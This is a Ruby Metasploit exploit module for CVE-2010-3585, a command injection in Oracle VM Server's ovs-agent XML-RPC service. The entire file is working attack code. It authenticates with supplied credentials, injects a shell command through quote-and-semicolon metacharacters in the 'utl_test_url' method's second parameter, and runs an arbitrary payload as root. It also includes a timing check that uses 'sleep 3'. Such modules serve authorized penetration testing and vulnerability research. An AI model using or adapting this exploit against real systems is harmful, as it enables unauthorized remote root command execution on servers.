##
# $Id: oracle_vm_agent_utl.rb 10821 2010-10-25 20:58:49Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle VM Server Virtual Server Agent Command Injection',
			'Description'    => %q{
					This module exploits a command injection flaw within Oracle\'s VM Server
				Virtual Server Agent (ovs-agent) service.

				By including shell meta characters within the second parameter to the 'utl_test_url'
				XML-RPC methodCall, an attacker can execute arbitrary commands. The service
				typically runs with root privileges.

				NOTE: Valid credentials are required to trigger this vulnerable. The username
				appears to be hardcoded as 'oracle', but the password is set by the administrator
				at installation time.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10821 $',
			'References'     =>
				[
					# ovs-agent.spec:- Fix ovs agent command injection [orabug 10146644] {CVE-2010-3585}
					['CVE', '2010-3585'],
					['OSVDB', '68797'],
					['BID', '44047']
				],
			'Privileged'     => true,
			'Platform'       => ['unix', 'linux'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space' => 512,
					'BadChars' => '<>',
					'DisableNops' => true,
					'Keys'  => ['cmd', 'cmd_bash'],
				},
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Oct 12 2010'
			))

		register_options(
			[
				Opt::RPORT(8899),
				OptBool.new('SSL', [ true, 'Use SSL', true ]),
				OptString.new('CMD', [ false,  "A single command to execute instead of the payload" ]),
				OptString.new('USERNAME', [ true,  "The user to authenticate as", 'oracle']),
				OptString.new('PASSWORD', [ true,  "The password to authenticate with" ])
			], self.class)

		deregister_options(
			'HTTP::junk_params', # not your typical POST, so don't inject params.
			'HTTP::junk_slashes' # For some reason junk_slashes doesn't always work, so turn that off for now.
			)
	end

	def go(command)
		datastore['BasicAuthUser'] = datastore['USERNAME']
		datastore['BasicAuthPass'] = datastore['PASSWORD']

		xml = <<-EOS
<?xml version="1.0"?>
<methodCall>
<methodName>utl_test_url</methodName>
<params><param>
<value><string>PARAM1</string></value>
</param></params>
<params><param>
<value><string>PARAM2</string></value>
</param></params>
<params><param>
<value><string>PARAM3</string></value>
</param></params>
<params><param>
<value><string>PARAM4</string></value>
</param></params>
</methodCall>
EOS

		sploit = rand_text_alphanumeric(rand(128)+32)
		sploit << "';" + command + ";'"

		xml.gsub!(/PARAM1/, 'http://' + rand_text_alphanumeric(rand(128)+32) + '/')
		xml.gsub!(/PARAM2/, sploit)
		xml.gsub!(/PARAM3/, rand_text_alphanumeric(rand(128)+32))
		xml.gsub!(/PARAM4/, rand_text_alphanumeric(rand(128)+32))

		res = send_request_cgi(
			{
				'uri'          => '/RPC2',
				'method'       => 'POST',
				'ctype'        => 'application/xml',
				'data'         => xml,
			}, 5)

		if not res
			if not session_created?
				print_error('Unable to complete XML-RPC request')	
				return nil
			end
			
			# no response, but session created!!!
			return true
		end

		case res.code
		when 403
			print_error('Authentication failed!')
			return nil

		when 200
			print_good('Our request was accepted!')
			return res

		end

		print_error("Encountered unexpected #{res.code} reponse:")
		print_error(res.inspect)

		return nil
	end

	def check
		print_status("Attempting to detect if the server is vulnerable...")

		# Try running/timing sleep 3
		start = Time.now
		go('sleep 3')
		elapsed = Time.now - start
		if elapsed >= 3 and elapsed <= 4
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		print_status("Attempting to execute the payload...")

		cmd = datastore['CMD']
		cmd ||= payload.encoded

		if not go(cmd)
			raise RuntimeError, "Unable to execute the desired command"
		end

		handler
	end

end
